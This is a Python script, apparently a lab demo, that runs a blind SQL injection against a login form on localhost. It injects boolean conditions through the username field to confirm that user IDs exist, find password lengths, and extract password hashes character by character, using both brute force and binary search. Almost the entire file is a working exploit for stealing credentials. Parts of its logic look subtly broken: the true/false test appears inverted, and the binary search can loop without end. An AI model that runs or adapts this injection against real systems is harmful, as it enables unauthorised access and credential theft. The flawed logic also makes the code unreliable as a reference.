import requests

# --- Config ---
CHARSET = "0123456789abcdef"
TARGET = "http://127.0.0.1:5000"
NEEDLE = "Welcome back"
TIMEOUT = 5
MAX_PASSWORD_LENGTH = 64

total_queries = 0

def injected_query(payload):
    global total_queries
    total_queries += 1
    try:
        r = requests.post(
            TARGET,
            data={
                "username": f"admin' and {payload}--",
                "password": "password"
            },
            timeout=TIMEOUT
        )
        return NEEDLE.encode() not in r.content
    except requests.RequestException as e:
        print(f"\t[X] Request error: {e}")
        return False

def boolean_query(offset, user_id, character, operator="="):
    payload = (
        f"(select hex(substr(password,{offset+1},1)) from user where id = {user_id}) {operator} hex('{character}')"
    )
    return injected_query(payload)

def invalid_user(user_id):
    payload = f"(select id from user where id = {user_id}) >= 0"
    return injected_query(payload)

def password_length(user_id, max_length=MAX_PASSWORD_LENGTH):
    for i in range(1, max_length + 1):
        payload = (
            f"(select length(password) from user where id = {user_id} and length(password) = {i} limit 1)"
        )
        if injected_query(payload):
            return i
    print("\t[X] Password length not found (exceeds max_length)")
    return None

def extract_hash(charset, user_id, password_length):
    found = ""
    for i in range(password_length):
        for c in charset:
            if boolean_query(i, user_id, c):
                found += c
                print(f"\t[-] Found char {i+1}: {c} -> {found}")
                break
        else:
            print(f"\t[X] Char at position {i+1} not found!")
            found += "?"
    return found

def extract_hash_bst(charset, user_id, password_length):
    found = ""
    for index in range(password_length):
        start, end = 0, len(charset) - 1
        while start < end:
            mid = (start + end) // 2
            if boolean_query(index, user_id, charset[mid], operator=">="):
                start = mid
            else:
                end = mid - 1
        # Kiểm tra lại ký tự cuối cùng
        if boolean_query(index, user_id, charset[start], operator="="):
            found += charset[start]
            print(f"\t[-] Found char {index+1}: {charset[start]} -> {found}")
        else:
            print(f"\t[X] Char at position {index+1} not found!")
            found += "?"
    return found

def total_queries_taken():
    global total_queries
    print(f"\t\t[!] {total_queries} total queries!")
    total_queries = 0

def main():
    print("=== Blind SQL Injection Demo ===")
    while True:
        try:
            user_id = input("> Enter a user ID to extract the password hash: ").strip()
            if not user_id.isdigit():
                print("\t[X] Please enter a valid numeric user ID!")
                continue
            if not invalid_user(user_id):
                user_password_length = password_length(user_id)
                if user_password_length:
                    print(f"\t[-] User {user_id} hash length: {user_password_length}")
                    total_queries_taken()
                    print(f"\t[-] Extracting hash for user {user_id} (brute-force)...")
                    password_hash = extract_hash(CHARSET, int(user_id), user_password_length)
                    print(f"\t[!] Hash for user {user_id}: {password_hash}")
                    total_queries_taken()
                    print(f"\t[-] Extracting hash for user {user_id} (binary search)...")
                    password_hash_bst = extract_hash_bst(CHARSET, int(user_id), user_password_length)
                    print(f"\t[!] Hash for user {user_id} (BST): {password_hash_bst}")
                    total_queries_taken()
                else:
                    print("\t[X] Could not determine password length.")
            else:
                print(f"\t[X] User {user_id} does not exist!")
        except KeyboardInterrupt:
            print("\nExiting...")
            break

if __name__ == "__main__":
    main()